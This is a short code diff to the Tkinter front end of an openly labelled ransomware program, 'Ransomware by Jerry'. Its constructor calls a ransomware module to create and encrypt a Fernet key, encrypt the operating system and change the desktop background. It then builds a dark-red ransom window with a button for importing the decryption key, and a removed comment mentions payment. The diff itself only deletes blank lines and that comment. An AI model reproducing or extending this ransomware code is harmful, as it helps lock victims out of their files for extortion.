@@ -11,13 +11,11 @@ from PIL import Image, ImageTk
 class Application:
     def __init__(self, master):
         self.master = master
-    
         self.malware = ransomware.Ransomware()
         self.malware.create_fernet_key()
         self.malware.encrypt_fernet_key()
         self.malware.encrypt_os()
         self.malware.update_background()
-
         master.geometry('900x650')
         master.title('Ransomware by Jerry')
         master.configure(bg='darkred')
@@ -38,17 +36,12 @@ class Application:
         self.render_bannerimg = ImageTk.PhotoImage(self.load_bannerimg)
         self.top_frame = tk.Label(master, bg='darkgrey', height=120, width=900, image=self.render_bannerimg)
         self.top_frame.pack()
-
         self.middle_frame = tk.Frame(master, bg='darkred', width=750)
         self.middle_frame.pack()
         self.info_label = tk.Label(self.middle_frame, text=self.message, font='ubuntu 17')
         self.info_label.pack(pady=20)
-        
         self.bottom_frame = tk.Frame(master, bg='darkred')
         self.bottom_frame.pack()
-        #self.bottom_lbl = tk.Label(self.bottom_frame, text='Click the button to import the decryption key after payment:', font='ubuntu 13')
-        #self.bottom_lbl.pack(side=LEFT, padx=4)
-
         self.pixelVirtual = tk.PhotoImage(width=1, height=1)
         self.bottom_btn = tk.Button(self.bottom_frame, image=self.pixelVirtual, compound='c', text='Click to here\nto Import Key', command=self.uploadAction, height=80, width=120)
         self.bottom_btn.pack(side=LEFT, pady=15)
